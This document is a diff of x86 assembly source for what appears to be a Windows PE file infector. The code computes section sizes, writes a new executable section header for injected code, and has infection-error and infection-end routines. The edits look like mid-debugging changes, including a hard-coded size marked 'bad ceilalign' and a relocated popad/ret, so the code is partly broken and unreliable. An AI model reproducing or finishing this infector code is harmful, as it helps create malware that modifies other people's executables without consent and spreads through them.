@@ -300,17 +300,17 @@ size_valid:
    
     
     mov  ecx, copy_size
-   
+    
     push edx
      mov edx,filealignment
     call ceil_align;, ecx, edx     ; Align size of our code with fileAlignment
     
     pop edx
-  
+
 
     mov  dword ptr[esi], eax                           ; Wrote SizeOfRawData
-    mov  filesize_sf, eax                        ; new filesize_sf, still need to add pointertorawdata (step 1/2)
-    
+    mov  filesize_sf, 1000   ;bad ceilalign                     ; new filesize_sf, still need to add pointertorawdata (step 1/2)
+   
     add  esi, 04h                             ; esi -> IMAGE_SECTION_HEADER[last + 1].PointerToRawData
     
     mov  ecx, lastsec_ptrtorawdata
@@ -319,14 +319,13 @@ size_valid:
     add  ecx, 0200h                           ; For when we move the sections (see around update_sec_hdrs: label)
      mov esi,edx
      ;mov  [esi], ecx                           ; Wrote PointerToRawData
-    
+
     push esi  
     lea esi,dword ptr[pointertorawdata]
     mov  esi, ecx
     pop  esi  
-      
-                   popad
-ret 
+            
+
     add  ecx, filesize_sf 
     push esi    
     lea esi,dword ptr[filesize_sf]             ;
@@ -340,6 +339,8 @@ ret
 
     mov  ecx, 060000020h                      ; Contains code | readable | executable
     mov esi,edx
+    
+
     ;mov  [esi], ecx
 
 ; --------------------------------------> New section header finally written. Phew !
@@ -481,7 +482,8 @@ infect_err:
     ret
 
 end_infect:
-
+                       popad
+ret 
     mov  eax, filesize_sf
     invoke MessageBoxA, NULL, addr msgEnd , addr msgCaption, MB_OK
     popad 
